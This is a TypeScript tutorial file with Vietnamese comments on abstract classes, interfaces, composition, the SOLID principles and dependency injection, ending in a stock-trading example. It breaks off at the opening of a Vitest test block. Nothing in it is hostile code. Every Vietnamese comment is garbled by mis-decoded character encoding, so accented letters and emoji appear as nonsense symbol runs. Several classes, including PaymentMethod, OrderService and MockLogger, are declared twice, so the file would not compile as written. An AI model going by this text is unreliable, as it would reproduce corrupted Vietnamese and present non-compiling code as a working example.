// üìê Abstract class: KH√îNG th·ªÉ t·∫°o instance tr·ª±c ti·∫øp, ch·ªâ ƒë·ªÉ k·∫ø th·ª´a
abstract class PaymentMethod {
  constructor(public provider: string) {} // provider = nh√† cung c·∫•p (Visa, Mastercard, VNPay...)

  // üî¥ Abstract method: B·∫ÆT BU·ªòC implement ·ªü subclass
  // Kh√¥ng c√≥ implementation (body) ·ªü ƒë√¢y
  abstract processPayment(amount: number): Promise<boolean>;

  // ‚úÖ Concrete method: c√≥ implementation, c√°c subclass d√πng chung
  validateAmount(amount: number): boolean {
    return amount > 0 && amount < 1_000_000; // Gi·ªõi h·∫°n 1 tri·ªáu
  }
}

// üìã Interface: "h·ª£p ƒë·ªìng" (contract) - class implement ph·∫£i c√≥ ƒë·ªß methods
interface IRefundable {
  refund(transactionId: string): Promise<void>; // Ho√†n ti·ªÅn
}

// üí≥ Thanh to√°n th·∫ª t√≠n d·ª•ng: extends abstract class + implements interface
class CreditCardPayment extends PaymentMethod implements IRefundable {
  constructor(
    provider: string, // Ch√∫ gi·∫£i: VD: 'Visa', 'Mastercard'
    private cardNumber: string // Ch√∫ gi·∫£i: S·ªë th·∫ª
  ) {
    super(provider); // Constructor: h√†m/ ph∆∞∆°ng th·ª©c d√πng v·ªõi `new` ƒë·ªÉ kh·ªüi t·∫°o instance; trong `class` ph·∫£i g·ªçi `super()` tr∆∞·ªõc khi d√πng `this` n·∫øu c√≥ k·∫ø th·ª´a.
  }

  // ‚úÖ Implement abstract method (B·∫ÆT BU·ªòC)
  async processPayment(amount: number): Promise<boolean> {
    // Validate b·∫±ng method c·ªßa parent
    if (!this.validateAmount(amount)) {
      console.log('‚ùå S·ªë ti·ªÅn kh√¥ng h·ª£p l·ªá!');
      return false;
    }

    // X·ª≠ l√Ω thanh to√°n th·∫ª
    console.log(`üí≥ ƒêang charge ${amount}ƒë v√†o th·∫ª ${this.cardNumber}...`);
 // Ch√∫ gi·∫£i: G·ªçi API gateway (VNPay, Stripe...)
    return true;
  }

 // Ch√∫ gi·∫£i: ‚úÖ Implement interface IRefundable
  async refund(transactionId: string): Promise<void> {
    console.log(`üí∞ ƒêang ho√†n ti·ªÅn giao d·ªãch ${transactionId}...`);
    // Logic ho√†n ti·ªÅn...
  }
}

// üè¶ Chuy·ªÉn kho·∫£n ng√¢n h√†ng: ch·ªâ extends abstract class (KH√îNG implement IRefundable)
class BankTransferPayment extends PaymentMethod {
  constructor(
    provider: string, // Ch√∫ gi·∫£i: VD: 'VCB', 'ACB'
    private bankCode: string // M√£ ng√¢n h√†ng
  ) {
    super(provider);
  }

  // ‚úÖ Implement abstract method (B·∫ÆT BU·ªòC)
  async processPayment(amount: number): Promise<boolean> {
    if (!this.validateAmount(amount)) return false;

    console.log(`üè¶ ƒêang chuy·ªÉn kho·∫£n ${amount}ƒë qua ${this.bankCode}...`);
    return true;
  }

  // ‚ùå KH√îNG c√≥ method refund() v√¨ kh√¥ng implement IRefundable
  // (Chuy·ªÉn kho·∫£n th∆∞·ªùng kh√¥ng ho√†n ti·ªÅn t·ª± ƒë·ªông)
}

 // Ch√∫ gi·∫£i: üéØ S·ª≠ d·ª•ng
const creditCard = new CreditCardPayment('Visa', '4111-1111-1111-1111');
await creditCard.processPayment(500_000); // ‚úÖ Thanh to√°n
await creditCard.refund('TXN123'); // ‚úÖ Ho√†n ti·ªÅn

const bankTransfer = new BankTransferPayment('VietcomBank', '970436');
await bankTransfer.processPayment(1_000_000); // ‚úÖ Chuy·ªÉn kho·∫£n
// await bankTransfer.refund('TXN456');      // ‚ùå Error: kh√¥ng c√≥ method refund()

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 4. COMPOSITION OVER INHERITANCE (T·ªêI ∆ØU NH·∫§T!)
 // Ch√∫ gi·∫£i: ============================================
// ‚ùå BAD: Deep inheritance hierarchy (C√¢y k·∫ø th·ª´a s√¢u - kh√≥ maintain)
class Animal {} // ƒê·ªông v·∫≠t
class Mammal extends Animal {} // ƒê·ªông v·∫≠t c√≥ v√∫
class Dog extends Mammal {} // Ch√≥
class Labrador extends Dog {} // Ch√≥ Labrador - QU√Å S√ÇU! Kh√≥ hi·ªÉu v√† maintain

// ü§î V·∫•n ƒë·ªÅ:
// - N·∫øu s·ª≠a Animal ‚Üí ·∫£nh h∆∞·ªüng t·∫•t c·∫£ classes con
// - Tight coupling: Labrador ph·ª• thu·ªôc v√†o Dog, Mammal, Animal
// - Kh√≥ test: ph·∫£i setup c·∫£ chain

// ‚úÖ GOOD: Composition pattern (K·∫øt h·ª£p - linh ho·∫°t h∆°n)
// üìù ƒê·ªãnh nghƒ©a interfaces (contracts)
interface ILogger {
  log(message: string): void; // Ch√∫ gi·∫£i: Ghi log
}

interface IEmailService {
  sendEmail(to: string, subject: string): Promise<void>; // Ch√∫ gi·∫£i: G·ª≠i email
}

// üîß Implementations c·ª• th·ªÉ
class ConsoleLogger implements ILogger {
  log(message: string): void {
    console.log(`[LOG] ${new Date().toISOString()}: ${message}`);
  }
}

class EmailService implements IEmailService {
  async sendEmail(to: string, subject: string): Promise<void> {
    console.log(`üìß G·ª≠i email ƒë·∫øn ${to}: ${subject}`);
 // Ch√∫ gi·∫£i: G·ªçi API SendGrid, AWS SES, SMTP...
  }
}

// üéØ UserService: COMPOSE (k·∫øt h·ª£p) thay v√¨ INHERIT (k·∫ø th·ª´a)
// "Has-a" relationship thay v√¨ "Is-a"
class UserService {
 // Constructor: h√†m/ ph∆∞∆°ng th·ª©c d√πng v·ªõi `new` ƒë·ªÉ kh·ªüi t·∫°o instance; trong `class` ph·∫£i g·ªçi `super()` tr∆∞·ªõc khi d√πng `this` n·∫øu c√≥ k·∫ø th·ª´a.
  constructor(
    private logger: ILogger, // Ch√∫ gi·∫£i: UserService HAS-A logger
    private emailService: IEmailService // Ch√∫ gi·∫£i: UserService HAS-A emailService
  ) {
    // ‚úÖ ∆Øu ƒëi·ªÉm:
 // Ch√∫ gi·∫£i: - D·ªÖ swap implementation (ConsoleLogger ‚Üí FileLogger)
 // Ch√∫ gi·∫£i: - D·ªÖ test (inject mock logger, mock emailService)
    // - Loose coupling (kh√¥ng ph·ª• thu·ªôc concrete classes)
  }

  async registerUser(email: string, password: string): Promise<void> {
    this.logger.log(`üöÄ ƒêang ƒëƒÉng k√Ω user: ${email}`);

    // Logic ƒëƒÉng k√Ω user...
 // Ch√∫ gi·∫£i: 1. Validate email/password
 // Ch√∫ gi·∫£i: 2. Hash password
    // 3. L∆∞u v√†o database

    // G·ª≠i email ch√†o m·ª´ng
    await this.emailService.sendEmail(email, 'Ch√†o m·ª´ng b·∫°n ƒë·∫øn v·ªõi n·ªÅn t·∫£ng!');

    this.logger.log(`‚úÖ User ƒë√£ ƒëƒÉng k√Ω th√†nh c√¥ng: ${email}`);
  }
}

 // Ch√∫ gi·∫£i: üéØ S·ª≠ d·ª•ng Dependency Injection
const userService = new UserService(
  new ConsoleLogger(), // Ch√∫ gi·∫£i: Inject logger implementation
  new EmailService() // Ch√∫ gi·∫£i: Inject email implementation
);

await userService.registerUser('user@example.com', 'password123');

// üí° D·ªÖ d√†ng thay ƒë·ªïi implementation:
class FileLogger implements ILogger {
  log(message: string): void {
    // Ghi v√†o file thay v√¨ console
  }
}

const userServiceWithFileLog = new UserService(
  new FileLogger(), // ‚úÖ Swap logger ‚Üí kh√¥ng c·∫ßn s·ª≠a UserService!
  new EmailService()
);

// üß™ D·ªÖ d√†ng test v·ªõi mocks:
class MockLogger implements ILogger {
  logs: string[] = [];
  log(message: string): void {
    this.logs.push(message); // L∆∞u logs ƒë·ªÉ verify
  }
}

class MockEmailService implements IEmailService {
  sentEmails: Array<{ to: string; subject: string }> = [];
  async sendEmail(to: string, subject: string): Promise<void> {
    this.sentEmails.push({ to, subject }); // L∆∞u emails ƒë·ªÉ verify
  }
}

const mockLogger = new MockLogger();
const mockEmailService = new MockEmailService();
const testService = new UserService(mockLogger, mockEmailService);

await testService.registerUser('test@example.com', 'pass');
console.log(mockLogger.logs); // Ch√∫ gi·∫£i: Verify logs
console.log(mockEmailService.sentEmails); // Ch√∫ gi·∫£i: Verify emails sent

 // Ch√∫ gi·∫£i: ============================================
// 5. SOLID PRINCIPLES IN ACTION (C√°c Nguy√™n T·∫Øc SOLID)
 // Ch√∫ gi·∫£i: ============================================

// üìê S - Single Responsibility Principle (Nguy√™n t·∫Øc Tr√°ch nhi·ªám ƒê∆°n)
// "M·ªói class ch·ªâ l√†m 1 vi·ªác duy nh·∫•t"

// ‚ùå BAD: God class - l√†m qu√° nhi·ªÅu vi·ªác
class UserManager {
  validateEmail(email: string): boolean {
    /* ... */
  } // Ch√∫ gi·∫£i: 1. Validate
  hashPassword(password: string): string {
    /* ... */
  } // Ch√∫ gi·∫£i: 2. Hash
  saveToDatabase(user: any): void {
    /* ... */
  } // Ch√∫ gi·∫£i: 3. Database
  sendWelcomeEmail(email: string): void {
    /* ... */
  } // Ch√∫ gi·∫£i: 4. Email
  logActivity(message: string): void {
    /* ... */
  } // Ch√∫ gi·∫£i: 5. Logging
 // Ch√∫ gi·∫£i: TOO MANY RESPONSIBILITIES!
}

// ‚úÖ GOOD: T√°ch ra th√†nh nhi·ªÅu classes, m·ªói class 1 tr√°ch nhi·ªám
class User {
 // Ch√∫ gi·∫£i: Ch·ªâ ch·ª©a data (entity/model)
  constructor(
    public id: string,
    public email: string,
    public password: string
  ) {}
}

class UserValidator {
  // CH·ªà l√†m validate
  validate(user: User): boolean {
    return user.email.includes('@') && user.password.length >= 8;
  }
}

class UserRepository {
  // CH·ªà l√†m database operations
  async save(user: User): Promise<void> {
    console.log('üíæ L∆∞u user v√†o database...');
 // Ch√∫ gi·∫£i: Database logic: INSERT INTO users...
  }

  async findById(id: string): Promise<User | null> {
    console.log(`üîç T√¨m user theo ID: ${id}`);
 // Ch√∫ gi·∫£i: Database logic: SELECT * FROM users WHERE id = ?
    return null;
  }
}

// üí° L·ª£i √≠ch:
// - D·ªÖ hi·ªÉu: ƒë·ªçc t√™n class l√† bi·∫øt l√†m g√¨
 // Ch√∫ gi·∫£i: - D·ªÖ maintain: s·ª≠a validation ‚Üí ch·ªâ s·ª≠a UserValidator
// - D·ªÖ test: test t·ª´ng class ri√™ng bi·ªát
// - D·ªÖ reuse: UserValidator c√≥ th·ªÉ d√πng cho nhi·ªÅu n∆°i

// üìê O - Open/Closed Principle (Nguy√™n t·∫Øc M·ªü-ƒê√≥ng)
// "M·ªü cho m·ªü r·ªông (extension), ƒë√≥ng cho s·ª≠a ƒë·ªïi (modification)"

// ‚ùå BAD: Ph·∫£i s·ª≠a code m·ªói khi th√™m discount type m·ªõi
class DiscountCalculator {
  calculate(price: number, type: string, value: number): number {
    if (type === 'percentage') {
      return price * (1 - value / 100);
    } else if (type === 'fixed') {
      return price - value;
    } else if (type === 'bogo') {
      // Th√™m type m·ªõi ‚Üí PH·∫¢I S·ª¨A CODE
      return price / 2;
    }
    return price;
  }
}

// ‚úÖ GOOD: D√πng abstract class + inheritance
abstract class Discount {
  abstract calculate(price: number): number; // Ch√∫ gi·∫£i: Abstract method
}

// 1Ô∏è‚É£ Gi·∫£m gi√° theo %
class PercentageDiscount extends Discount {
  constructor(private percent: number) {
    super();
  }

  calculate(price: number): number {
    return price * (1 - this.percent / 100);
  }
}

// 2Ô∏è‚É£ Gi·∫£m gi√° c·ªë ƒë·ªãnh
class FixedDiscount extends Discount {
  constructor(private amount: number) {
    super();
  }

  calculate(price: number): number {
    return Math.max(0, price - this.amount);
  }
}

// 3Ô∏è‚É£ Mua 1 t·∫∑ng 1 (Buy One Get One)
class BuyOneGetOne extends Discount {
  calculate(price: number): number {
    return price / 2;
  }
}

// 4Ô∏è‚É£ Th√™m discount type M·ªöI ‚Üí KH√îNG C·∫¶N S·ª¨A code c≈©!
class SeasonalDiscount extends Discount {
  constructor(private multiplier: number) {
    super();
  }

  calculate(price: number): number {
    return price * this.multiplier;
  }
}

 // Ch√∫ gi·∫£i: üéØ S·ª≠ d·ª•ng
function applyDiscount(price: number, discount: Discount): number {
  return discount.calculate(price); // Ch√∫ gi·∫£i: Polymorphism
}

const price = 100_000;
console.log(applyDiscount(price, new PercentageDiscount(20))); // Ch√∫ gi·∫£i: 80,000
console.log(applyDiscount(price, new FixedDiscount(15_000))); // Ch√∫ gi·∫£i: 85,000
console.log(applyDiscount(price, new BuyOneGetOne())); // Ch√∫ gi·∫£i: 50,000
console.log(applyDiscount(price, new SeasonalDiscount(0.7))); // Ch√∫ gi·∫£i: 70,000

// üí° L·ª£i √≠ch:
// - Th√™m t√≠nh nƒÉng m·ªõi ‚Üí ch·ªâ c·∫ßn th√™m class m·ªõi
// - KH√îNG s·ª≠a code c≈© ‚Üí kh√¥ng risk break existing features
// - Tu√¢n th·ªß Open/Closed: Open for extension, Closed for modification

// üìê L - Liskov Substitution Principle (Nguy√™n t·∫Øc Thay th·∫ø Liskov)
// "Subclass ph·∫£i thay th·∫ø ƒë∆∞·ª£c parent m√† kh√¥ng l√†m break code"

 // Ch√∫ gi·∫£i: ‚ùå BAD: Subclass vi ph·∫°m "contract" c·ªßa parent
abstract class Bird {
  abstract fly(): void; // T·∫•t c·∫£ birds ƒë·ªÅu fly
}

class Sparrow extends Bird {
  fly(): void {
    console.log('üê¶ Chim s·∫ª bay!');
  }
}

class Penguin extends Bird {
  fly(): void {
    // ‚ùå Chim c√°nh c·ª•t KH√îNG bay ƒë∆∞·ª£c!
    throw new Error('Penguins cannot fly!');
  }
}

function makeBirdFly(bird: Bird) {
  bird.fly(); // Expect t·∫•t c·∫£ birds ƒë·ªÅu fly
}

makeBirdFly(new Sparrow()); // Ch√∫ gi·∫£i: ‚úÖ OK
makeBirdFly(new Penguin()); // Ch√∫ gi·∫£i: ‚ùå Error! Violate LSP

// ‚úÖ GOOD: Subclass tu√¢n th·ªß parent contract
abstract class PaymentMethod {
  abstract processPayment(amount: number): Promise<boolean>;

  validateAmount(amount: number): boolean {
    return amount > 0 && amount < 1_000_000;
  }
}

class CreditCardPayment extends PaymentMethod {
  constructor(private provider: string, private cardNumber: string) {
    super();
  }

  async processPayment(amount: number): Promise<boolean> {
    console.log(`üí≥ Thanh to√°n ${amount}ƒë qua th·∫ª ${this.provider}`);
    return true; // ‚úÖ Tu√¢n th·ªß contract: return boolean
  }
}

class BankTransferPayment extends PaymentMethod {
  constructor(private bank: string, private bankCode: string) {
    super();
  }

  async processPayment(amount: number): Promise<boolean> {
    console.log(`üè¶ Chuy·ªÉn kho·∫£n ${amount}ƒë qua ${this.bank}`);
    return true; // ‚úÖ Tu√¢n th·ªß contract: return boolean
  }
}

// üéØ Function ch·∫•p nh·∫≠n B·∫§T K·ª≤ PaymentMethod n√†o
async function processPayment(method: PaymentMethod, amount: number) {
 // Ch√∫ gi·∫£i: Works v·ªõi T·∫§T C·∫¢ subclasses ‚Üí LSP satisfied
  if (method.validateAmount(amount)) {
    const success = await method.processPayment(amount);
    console.log(success ? '‚úÖ Th√†nh c√¥ng' : '‚ùå Th·∫•t b·∫°i');
  }
}

// ‚úÖ C·∫£ 2 ƒë·ªÅu work perfect (Liskov Substitution)
await processPayment(new CreditCardPayment('Visa', '1234'), 100_000);
await processPayment(new BankTransferPayment('ACB', '970416'), 200_000);

// üí° L·ª£i √≠ch:
 // Ch√∫ gi·∫£i: - Code predictable: subclass behave nh∆∞ parent
// - Safe refactoring: thay parent ‚Üí subclass m√† kh√¥ng break
// - Polymorphism ƒë√∫ng nghƒ©a: "nhi·ªÅu h√¨nh d·∫°ng, c√πng interface"

// üìê I - Interface Segregation Principle (Nguy√™n t·∫Øc T√°ch Interface)
// "Nhi·ªÅu interfaces nh·ªè > 1 interface l·ªõn"
// "Class ch·ªâ implement methods c·∫ßn thi·∫øt, kh√¥ng b·ªã √©p implement methods kh√¥ng d√πng"

// ‚ùå BAD: Interface qu√° l·ªõn, √©p implement methods kh√¥ng c·∫ßn
interface IFile {
  read(): string;
  write(data: string): void;
  delete(): void;
  compress(): void;
  encrypt(): void;
}

// ReadOnlyFile b·ªã √©p implement write/delete/compress/encrypt (kh√¥ng c·∫ßn!)
class ReadOnlyFile implements IFile {
  read(): string {
    return 'file content';
  }

  write(data: string): void {
    throw new Error('Read-only!'); // ‚ùå Kh√¥ng c·∫ßn nh∆∞ng ph·∫£i implement
  }

  delete(): void {
    throw new Error('Cannot delete!'); // ‚ùå Kh√¥ng c·∫ßn nh∆∞ng ph·∫£i implement
  }

  compress(): void {
    throw new Error('Cannot compress!'); // ‚ùå Kh√¥ng c·∫ßn nh∆∞ng ph·∫£i implement
  }

  encrypt(): void {
    throw new Error('Cannot encrypt!'); // ‚ùå Kh√¥ng c·∫ßn nh∆∞ng ph·∫£i implement
  }
}

// ‚úÖ GOOD: T√°ch th√†nh nhi·ªÅu interfaces nh·ªè, focused
interface IReadable {
  read(): string;
}

interface IWritable {
  write(data: string): void;
}

interface IDeletable {
  delete(): void;
}

interface ICompressible {
  compress(): void;
}

interface IEncryptable {
  encrypt(key: string): void;
}

 // Ch√∫ gi·∫£i: ‚úÖ ReadOnlyFile: ch·ªâ implement IReadable
class ReadOnlyFile implements IReadable {
  read(): string {
    return 'üìÑ ƒê·ªçc file content...';
  }
  // KH√îNG c·∫ßn implement write/delete/compress/encrypt
}

// ‚úÖ FullAccessFile: implement nhi·ªÅu interfaces t√πy nhu c·∫ßu
class FullAccessFile implements IReadable, IWritable, IDeletable {
  read(): string {
    return 'üìÑ ƒê·ªçc file...';
  }

  write(data: string): void {
    console.log(`‚úçÔ∏è Ghi data: ${data}`);
  }

  delete(): void {
    console.log('üóëÔ∏è X√≥a file...');
  }
}

 // Ch√∫ gi·∫£i: ‚úÖ SecureFile: implement read/write + encrypt
class SecureFile implements IReadable, IWritable, IEncryptable {
  read(): string {
    return 'üîí ƒê·ªçc encrypted file...';
  }

  write(data: string): void {
    console.log(`üîí Ghi encrypted data...`);
  }

  encrypt(key: string): void {
    console.log(`üîê M√£ h√≥a file v·ªõi key: ${key}`);
  }
}

 // Ch√∫ gi·∫£i: üéØ S·ª≠ d·ª•ng
const readOnly = new ReadOnlyFile();
readOnly.read(); // Ch√∫ gi·∫£i: ‚úÖ OK

const fullAccess = new FullAccessFile();
fullAccess.read();
fullAccess.write('new data');
fullAccess.delete();

const secure = new SecureFile();
secure.read();
secure.write('sensitive data');
secure.encrypt('my-secret-key');

// üí° L·ª£i √≠ch:
// - Class ch·ªâ implement methods c·∫ßn thi·∫øt
// - Tr√°nh "fat interfaces" kh√≥ maintain
// - D·ªÖ compose: k·∫øt h·ª£p nhi·ªÅu small interfaces
// - Follow Single Responsibility: m·ªói interface 1 m·ª•c ƒë√≠ch

// üìê D - Dependency Inversion Principle (Nguy√™n t·∫Øc ƒê·∫£o ng∆∞·ª£c Ph·ª• thu·ªôc)
// "Ph·ª• thu·ªôc v√†o ABSTRACTIONS (interfaces/abstract classes), KH√îNG ph·ª• thu·ªôc v√†o CONCRETIONS (concrete classes)"

// ‚ùå BAD: Ph·ª• thu·ªôc tr·ª±c ti·∫øp v√†o concrete classes (tight coupling)
class OrderService {
  private paymentProcessor = new CreditCardPayment('Visa', '1234'); // Ch√∫ gi·∫£i: ‚ùå Hardcoded
  private logger = new ConsoleLogger(); // Ch√∫ gi·∫£i: ‚ùå Hardcoded

  async checkout(amount: number): Promise<void> {
    this.logger.log(`Processing order: $${amount}`);
    await this.paymentProcessor.processPayment(amount);
  }

  // ü§î V·∫•n ƒë·ªÅ:
  // - Kh√¥ng th·ªÉ thay ƒë·ªïi payment method (b·ªã lock v√†o CreditCardPayment)
  // - Kh√¥ng th·ªÉ test v·ªõi mock logger (b·ªã lock v√†o ConsoleLogger)
  // - Tight coupling: OrderService ph·ª• thu·ªôc v√†o concrete implementations
}

// ‚úÖ GOOD: Ph·ª• thu·ªôc v√†o abstractions (interfaces) ‚Üí Dependency Injection
class OrderService {
  constructor(
    private paymentProcessor: PaymentMethod, // Ch√∫ gi·∫£i: ‚úÖ Abstraction (abstract class)
    private logger: ILogger // Ch√∫ gi·∫£i: ‚úÖ Abstraction (interface)
  ) {
    // ‚úÖ ∆Øu ƒëi·ªÉm:
    // - Inject b·∫•t k·ª≥ PaymentMethod implementation n√†o (CreditCard, BankTransfer, Momo...)
    // - Inject b·∫•t k·ª≥ ILogger implementation n√†o (ConsoleLogger, FileLogger, RemoteLogger...)
 // Ch√∫ gi·∫£i: - D·ªÖ test: inject mock implementations
  }

  async checkout(amount: number): Promise<void> {
    this.logger.log(`üõí ƒêang x·ª≠ l√Ω ƒë∆°n h√†ng: ${amount}ƒë`);
    const success = await this.paymentProcessor.processPayment(amount);

    if (success) {
      this.logger.log('‚úÖ Thanh to√°n th√†nh c√¥ng!');
    } else {
      this.logger.log('‚ùå Thanh to√°n th·∫•t b·∫°i!');
    }
  }
}

// üéØ Production: D√πng real implementations
const productionOrderService = new OrderService(
  new CreditCardPayment('Mastercard', '5678'),
  new ConsoleLogger()
);

// üß™ Testing: D√πng mock implementations
class MockPaymentMethod extends PaymentMethod {
  async processPayment(amount: number): Promise<boolean> {
    console.log(`[MOCK] Processing ${amount}`);
    return true; // Ch√∫ gi·∫£i: Always success for testing
  }
  validateAmount(amount: number): boolean {
    return true;
  }
}

class MockLogger implements ILogger {
  logs: string[] = [];
  log(message: string): void {
    this.logs.push(message); // Capture logs ƒë·ªÉ verify
  }
}

const mockLogger = new MockLogger();
const testOrderService = new OrderService(new MockPaymentMethod(), mockLogger);

await testOrderService.checkout(100_000);
console.log(mockLogger.logs); // ['üõí ƒêang x·ª≠ l√Ω ƒë∆°n h√†ng: 100000ƒë', '‚úÖ Thanh to√°n th√†nh c√¥ng!']

// üåç Different environments: D·ªÖ d√†ng swap implementations
class FileLogger implements ILogger {
  log(message: string): void {
    // Ghi v√†o file thay v√¨ console
    console.log(`[FILE] ${message}`);
  }
}

const fileLoggerOrderService = new OrderService(
  new BankTransferPayment('VietcomBank', '970436'),
  new FileLogger() // ‚úÖ Thay logger m√† kh√¥ng s·ª≠a OrderService!
);

// üí° L·ª£i √≠ch:
// - Loose coupling: OrderService kh√¥ng ph·ª• thu·ªôc concrete classes
 // Ch√∫ gi·∫£i: - Flexible: d·ªÖ swap implementations (dev/staging/production)
 // Ch√∫ gi·∫£i: - Testable: inject mocks cho unit tests
 // Ch√∫ gi·∫£i: - Follow SOLID: Single Responsibility + Open/Closed + Dependency Inversion

 // Ch√∫ gi·∫£i: ============================================
// 6. V√ç D·ª§ TH·ª∞C T·∫æ: H·ªÜ TH·ªêNG TRADING (Giao d·ªãch Ch·ª©ng kho√°n)
 // Ch√∫ gi·∫£i: ============================================
// üéØ √Åp d·ª•ng T·∫§T C·∫¢ SOLID principles + Composition + Dependency Injection

// üìã 1. ƒê·ªãnh nghƒ©a Interfaces (Contracts)
interface IOrderValidator {
  validate(order: Order): boolean; // Validate l·ªánh giao d·ªãch
}

interface IOrderExecutor {
  execute(order: Order): Promise<void>; // Th·ª±c thi l·ªánh
}

interface IRiskManager {
  checkRisk(order: Order): boolean; // Ki·ªÉm tra r·ªßi ro
}

// üì¶ 2. Entity: Order (L·ªánh giao d·ªãch)
class Order {
  constructor(
    public symbol: string, // M√£ CK: 'AAPL', 'VNM', 'HPG'...
    public quantity: number, // Ch√∫ gi·∫£i: S·ªë l∆∞·ª£ng: 100, 500...
    public price: number, // Gi√°: 150, 75.5...
    public side: 'BUY' | 'SELL' // Mua/B√°n
  ) {}

  // Helper method: t√≠nh gi√° tr·ªã l·ªánh
  getValue(): number {
    return this.quantity * this.price;
  }
}

// üîç 3. OrderValidator: Validate l·ªánh (Single Responsibility)
class OrderValidator implements IOrderValidator {
  validate(order: Order): boolean {
    // Ki·ªÉm tra s·ªë l∆∞·ª£ng v√† gi√° h·ª£p l·ªá
    if (order.quantity <= 0) {
      console.log('‚ùå S·ªë l∆∞·ª£ng ph·∫£i > 0');
      return false;
    }

    if (order.price <= 0) {
      console.log('‚ùå Gi√° ph·∫£i > 0');
      return false;
    }

    if (!order.symbol || order.symbol.trim() === '') {
      console.log('‚ùå M√£ CK kh√¥ng h·ª£p l·ªá');
      return false;
    }

    console.log('‚úÖ L·ªánh h·ª£p l·ªá');
    return true;
  }
}

// ‚ö†Ô∏è 4. RiskManager: Ki·ªÉm tra r·ªßi ro (Single Responsibility)
class RiskManager implements IRiskManager {
  constructor(
    private maxOrderValue: number // Gi√° tr·ªã l·ªánh t·ªëi ƒëa (VD: 100 tri·ªáu)
  ) {}

  checkRisk(order: Order): boolean {
    const orderValue = order.getValue();

    if (orderValue > this.maxOrderValue) {
      console.log(
        `‚ö†Ô∏è V∆∞·ª£t h·∫°n m·ª©c! Gi√° tr·ªã l·ªánh: ${orderValue}ƒë > H·∫°n m·ª©c: ${this.maxOrderValue}ƒë`
      );
      return false;
    }

    console.log(`‚úÖ Trong h·∫°n m·ª©c. Gi√° tr·ªã l·ªánh: ${orderValue}ƒë`);
    return true;
  }
}

// üöÄ 5. OrderExecutor: Th·ª±c thi l·ªánh (Single Responsibility)
class OrderExecutor implements IOrderExecutor {
  async execute(order: Order): Promise<void> {
    console.log(
      `üöÄ ƒêang g·ª≠i l·ªánh ${order.side} ${order.quantity} ${order.symbol} @ ${order.price}ƒë...`
    );

 // Ch√∫ gi·∫£i: Call Exchange API (HOSE, HNX, NASDAQ...)
    await this.callExchangeAPI(order);

    console.log('‚úÖ L·ªánh ƒë√£ ƒë∆∞·ª£c g·ª≠i ƒë·∫øn s√†n');
  }

  private async callExchangeAPI(order: Order): Promise<void> {
 // Ch√∫ gi·∫£i: Simulate API call
    await new Promise((resolve) => setTimeout(resolve, 100));
 // Ch√∫ gi·∫£i: Real: await axios.post('/api/orders', order);
  }
}

// üéØ 6. TradingService: Orchestrate (ƒëi·ªÅu ph·ªëi) t·∫•t c·∫£ services
// ‚úÖ Dependency Inversion: ph·ª• thu·ªôc v√†o interfaces, kh√¥ng ph·∫£i concrete classes
class TradingService {
  constructor(
    private validator: IOrderValidator, // Ch√∫ gi·∫£i: ‚úÖ Interface
    private riskManager: IRiskManager, // Ch√∫ gi·∫£i: ‚úÖ Interface
    private executor: IOrderExecutor, // Ch√∫ gi·∫£i: ‚úÖ Interface
    private logger: ILogger // Ch√∫ gi·∫£i: ‚úÖ Interface
  ) {
 // Constructor: h√†m/ ph∆∞∆°ng th·ª©c d√πng v·ªõi `new` ƒë·ªÉ kh·ªüi t·∫°o instance; trong `class` ph·∫£i g·ªçi `super()` tr∆∞·ªõc khi d√πng `this` n·∫øu c√≥ k·∫ø th·ª´a.
  }

  async placeOrder(order: Order): Promise<void> {
    this.logger.log(
      `üìù ƒê·∫∑t l·ªánh: ${order.side} ${order.quantity} ${order.symbol}`
    );

    // 1Ô∏è‚É£ Validate l·ªánh
    if (!this.validator.validate(order)) {
      throw new Error('L·ªánh kh√¥ng h·ª£p l·ªá!');
    }

    // 2Ô∏è‚É£ Ki·ªÉm tra r·ªßi ro
    if (!this.riskManager.checkRisk(order)) {
      throw new Error('V∆∞·ª£t h·∫°n m·ª©c r·ªßi ro!');
    }

    // 3Ô∏è‚É£ Th·ª±c thi l·ªánh
    await this.executor.execute(order);

    this.logger.log(`‚úÖ ƒê·∫∑t l·ªánh th√†nh c√¥ng: ${order.symbol}`);
  }
}

 // Ch√∫ gi·∫£i: üîß 7. Wire up dependencies (Dependency Injection Container)
const tradingService = new TradingService(
  new OrderValidator(), // Ch√∫ gi·∫£i: Inject validator
  new RiskManager(100_000_000), // Inject risk manager (h·∫°n m·ª©c 100 tri·ªáu)
  new OrderExecutor(), // Ch√∫ gi·∫£i: Inject executor
  new ConsoleLogger() // Ch√∫ gi·∫£i: Inject logger
);

 // Ch√∫ gi·∫£i: üéØ 8. S·ª≠ d·ª•ng
const buyOrder = new Order('AAPL', 100, 150, 'BUY');
await tradingService.placeOrder(buyOrder);

const sellOrder = new Order('VNM', 500, 75.5, 'SELL');
await tradingService.placeOrder(sellOrder);

// ‚ùå L·ªánh kh√¥ng h·ª£p l·ªá
try {
  const invalidOrder = new Order('HPG', -10, 50, 'BUY'); // S·ªë l∆∞·ª£ng √¢m
  await tradingService.placeOrder(invalidOrder);
} catch (error) {
  console.log(error.message); // 'L·ªánh kh√¥ng h·ª£p l·ªá!'
}

 // Ch√∫ gi·∫£i: ‚ùå V∆∞·ª£t h·∫°n m·ª©c
try {
  const bigOrder = new Order('AAPL', 1_000_000, 200, 'BUY'); // 200 tri·ªáu > 100 tri·ªáu
  await tradingService.placeOrder(bigOrder);
} catch (error) {
  console.log(error.message); // Ch√∫ gi·∫£i: 'V∆∞·ª£t h·∫°n m·ª©c r·ªßi ro!'
}

// üí° L·ª£i √≠ch c·ªßa architecture n√†y:
// ‚úÖ Single Responsibility: m·ªói class 1 nhi·ªám v·ª•
// ‚úÖ Open/Closed: th√™m validator/risk rule m·ªõi m√† kh√¥ng s·ª≠a code c≈©
// ‚úÖ Liskov Substitution: thay OrderValidator b·∫±ng AdvancedOrderValidator
 // Ch√∫ gi·∫£i: ‚úÖ Interface Segregation: interfaces nh·ªè, focused
 // Ch√∫ gi·∫£i: ‚úÖ Dependency Inversion: TradingService ph·ª• thu·ªôc interfaces
 // Ch√∫ gi·∫£i: ‚úÖ Testable: d·ªÖ inject mocks cho unit tests
// ‚úÖ Maintainable: d·ªÖ hi·ªÉu, d·ªÖ s·ª≠a, d·ªÖ extend

 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: 7. TESTING v·ªõi Vitest (D·ªÖ mock nh·ªù Composition + DI)
 // Ch√∫ gi·∫£i: ============================================
import { describe, it, expect, vi } from 'vitest';

describe('TradingService', () => {
